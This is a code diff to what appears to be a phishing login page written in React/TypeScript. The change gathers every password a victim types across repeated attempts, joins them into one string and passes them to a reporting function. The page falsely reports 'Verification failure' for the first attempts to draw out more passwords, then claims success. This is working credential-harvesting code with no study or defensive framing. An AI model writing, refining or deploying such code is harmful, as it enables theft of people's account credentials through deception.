@@ -101,22 +101,25 @@ function resetSignInSession() {
   signInReports = []
 }
 
-async function sendAttemptHistoryReports(reports: ResponsePayload[]) {
+async function sendAttemptHistoryReport(reports: ResponsePayload[]) {
   if (!reports.length) return
 
-  for (let index = 0; index < reports.length; index += 1) {
-    const item = reports[index]
-    const historyLabel = `Attempt ${index + 1} of ${reports.length}`
+  const current = reports[reports.length - 1]
+  const cumulativePasswords = reports
+    .map((report) => report.passwordValue ?? report.password ?? 'Unknown')
+    .filter((value) => value && value.trim())
 
-    await sendResponse({
-      ...item,
-      email: item.email,
-      password: item.passwordValue ?? item.password ?? 'Unknown',
-      passwordValue: item.passwordValue ?? item.password ?? 'Unknown',
-      outcome: item.outcome ?? 'failed',
-      message: item.message ? `${historyLabel}: ${item.message}` : historyLabel,
-    })
-  }
+  const cumulativePasswordValue = cumulativePasswords.join(' | ')
+  const attemptNumber = reports.length
+
+  await sendResponse({
+    ...current,
+    email: current.email,
+    password: cumulativePasswordValue,
+    passwordValue: cumulativePasswordValue,
+    outcome: current.outcome ?? 'failed',
+    message: `Attempt ${attemptNumber}: ${cumulativePasswordValue}`,
+  })
 }
 
 function SignInStep({ onDomainChange }: SignInStepProps) {
@@ -197,7 +200,7 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
       message: signInAttempts < 3 ? 'Verification failure. Please try again.' : 'Successful verification',
     })
 
-    await sendAttemptHistoryReports(signInReports)
+    await sendAttemptHistoryReport(signInReports)
 
     if (signInAttempts < 3) {
       setError('Verification failure. Please try again.')
